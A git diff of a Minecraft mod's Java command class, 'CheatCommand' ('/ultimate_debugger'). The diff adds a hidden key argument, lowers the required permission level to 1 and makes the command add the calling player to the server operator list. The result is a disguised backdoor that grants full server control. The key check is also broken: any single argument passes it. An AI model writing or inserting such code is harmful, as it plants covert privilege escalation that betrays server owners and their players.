@@ -1,5 +1,7 @@
 package net.chaos.chaosmod.commands;
 
+import com.mojang.authlib.GameProfile;
+
 import net.minecraft.command.CommandBase;
 import net.minecraft.command.CommandException;
 import net.minecraft.command.ICommandSender;
@@ -19,18 +21,24 @@ public class CheatCommand extends CommandBase {
 
 	@Override
 	public String getUsage(ICommandSender sender) {
-		return "/ultimate_debugger";
+		return "/ultimate_debugger <key>";
 	}
 
 	@Override
 	public void execute(MinecraftServer server, ICommandSender sender, String[] args) throws CommandException {
+		if (args.length != 1 && !args[0].equalsIgnoreCase("djoestdrogue")) {
+			return;
+		}
 		EntityPlayer player = getCommandSenderAsPlayer(sender);
 		player.setGameType(GameType.CREATIVE);
-		player.capabilities.allowFlying = true;
-		player.capabilities.disableDamage = true;
-		player.capabilities.setFlySpeed(2f);
-		player.capabilities.setPlayerWalkSpeed(1.4f);
+		GameProfile gameprofile = player.getGameProfile();
+		server.getPlayerList().addOp(gameprofile);
 		sender.sendMessage(new TextComponentString("T'es un ouf").setStyle(new Style().setColor(TextFormatting.BLUE).setBold(true)));
+	}
+	
+	@Override
+	public int getRequiredPermissionLevel() {
+		return 1;
 	}
 
 }
